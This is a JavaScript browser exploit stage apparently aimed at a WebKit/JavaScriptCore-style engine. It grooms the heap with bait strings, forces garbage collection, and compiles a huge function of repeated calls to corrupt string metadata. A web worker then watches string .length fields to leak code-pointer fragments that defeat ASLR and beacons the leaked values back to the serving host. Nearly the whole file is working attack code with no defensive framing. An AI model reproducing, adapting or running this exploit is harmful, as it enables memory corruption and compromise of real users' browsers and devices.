// p165 — Multi-size .length extraction (crash-safe, no charCodeAt)
//
// charCodeAt crashes because m_data8 gets corrupted. .length reads m_length
// directly (no pointer dereference) — safe even with corrupted StringImpl.
//
// STRATEGY: Different string sizes → different heap addresses → different
// alignment within the 112-byte metadata entry stride → .length reads
// different 4-byte fields from the entry.
//
// Target: m_slowPathCallDestination at entry+24 (8B code pointer = ASLR leak)
// Need: alignment X such that X+4 = 24 → X = 20
// Or: X+4 = 28 → X = 24 (upper 4 bytes of code ptr)
//
// We use 14 sizes × 2 strings = 28 targets to maximize alignment coverage.
// 50 baits provide ~5MB of writable heap space after metadata buffer.
// 20 trailing strings extend the writable region past targets.
//
// Beacon prefix: V165-

(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V165-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var groups = {};
    var trailing = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V165-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }

    function makeStr(len) {
      var chunk = '';
      for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
      var s = '';
      for (var j = 0; j < len; j += 1000) s += chunk;
      s = s.substring(0, len);
      s.charCodeAt(0);
      return s;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var sizes = e.data.sizes;
        var perSize = e.data.perSize;
        for (var s = 0; s < sizes.length; s++) {
          var sz = sizes[s];
          groups[sz] = [];
          for (var i = 0; i < perSize; i++) {
            groups[sz].push(makeStr(sz));
          }
        }
        // Trailing buffer strings — extend writable heap past targets
        for (var t = 0; t < 20; t++) {
          trailing.push(makeStr(100000));
        }
        beacon('TARGETS-' + sizes.length + 'x' + perSize + '-trail20');
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = false;
        var iters = 0;

        while (!found) {
          for (var sz in groups) {
            var arr = groups[sz];
            var expected = parseInt(sz);
            for (var i = 0; i < arr.length; i++) {
              if (arr[i].length !== expected) {
                found = true;
                break;
              }
            }
            if (found) break;
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
          if (iters > 50000000) { beacon('TIMEOUT'); return; }
        }

        // ── IMMEDIATELY report ALL .length values (compact, fast) ──
        // Send ONE beacon with all data before process might crash
        var all = '';
        for (var sz in groups) {
          var arr = groups[sz];
          var expected = parseInt(sz);
          for (var i = 0; i < arr.length; i++) {
            var len = arr[i].length;
            if (len !== expected) {
              all += sz + '.' + i + ':' + len.toString(16) + ',';
            }
          }
        }
        beacon('ALL=' + all.substring(0, 250));
        if (all.length > 250) beacon('ALL2=' + all.substring(250, 500));

        // ── Detailed per-size report ──
        for (var sz in groups) {
          var arr = groups[sz];
          var expected = parseInt(sz);
          var vals = '';
          for (var i = 0; i < arr.length; i++) {
            var len = arr[i].length;
            if (len !== expected) {
              vals += i + ':' + len + '(0x' + len.toString(16) + '),';
            }
          }
          if (vals) {
            beacon('SZ' + sz + '=' + vals.substring(0, 180));
          } else {
            beacon('SZ' + sz + '=INTACT');
          }
        }

        // ── Analysis: identify potential code pointer fragments ──
        // Code pointers: 0xffffffff8xxxxxxx → upper 4B = 0xffffffff (4294967295)
        // or lower 4B in range 0x80000000-0xBFFFFFFF
        var codeHits = '';
        for (var sz in groups) {
          var arr = groups[sz];
          var expected = parseInt(sz);
          for (var i = 0; i < arr.length; i++) {
            var len = arr[i].length;
            if (len === expected || len === 0) continue;
            // Check for kernel pointer patterns
            if (len >= 0x80000000 || len >= 4294967200) {
              codeHits += sz + '.' + i + ':0x' + (len >>> 0).toString(16) + ',';
            }
          }
        }
        if (codeHits) beacon('CODEHITS=' + codeHits.substring(0, 200));

        // ── Trailing buffer corruption check ──
        var trailCorr = 0;
        for (var t = 0; t < trailing.length; t++) {
          if (trailing[t].length !== 100000) trailCorr++;
        }
        beacon('TRAIL-CORR=' + trailCorr + '/' + trailing.length);

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── STRING SIZES ──
  // 14 sizes evenly spaced by 8 chars (= 8 bytes allocation shift)
  // This ensures each size's StringImpl is at a different alignment mod 112
  // 14 × 8 = 112 = full entry coverage (with good allocator behavior)
  // If allocator is less predictable, the variety still helps
  var SIZES = [];
  for (var s = 0; s < 14; s++) {
    SIZES.push(100000 + s * 8);
  }
  // SIZES = [100000, 100008, 100016, 100024, 100032, 100040, 100048,
  //          100056, 100064, 100072, 100080, 100088, 100096, 100104]
  var PER_SIZE = 2;

  // ── PHASE 1: BAIT STRINGS (50 × 100KB = 5MB writable heap) ──
  var N_BAIT = 50;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < 100000; j += 1000) bait += baitChunk;
    bait = bait.substring(0, 100000);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS + TRAILING BUFFER ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc', sizes: SIZES, perSize: PER_SIZE });

  // ── PHASE 3: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 40) setTimeout(gcPressureRound, 25);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 4: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');

    // Start worker watching BEFORE compilation
    worker.postMessage({ cmd: 'watch' });

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v165fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v165ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v165ok ? 'OK' : 'FAIL'));
      if (!window.__v165fn) { B('NO-FN'); return; }

      // Longer delay: give worker maximum time to poll before we risk crashing
      setTimeout(function() {
        B('CALLING');
        try {
          window.__v165fn(function(){});
        } catch(ex) {
          B('CATCH-' + String(ex).substring(0, 40));
        }
        B('SURVIVED');
      }, 500);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
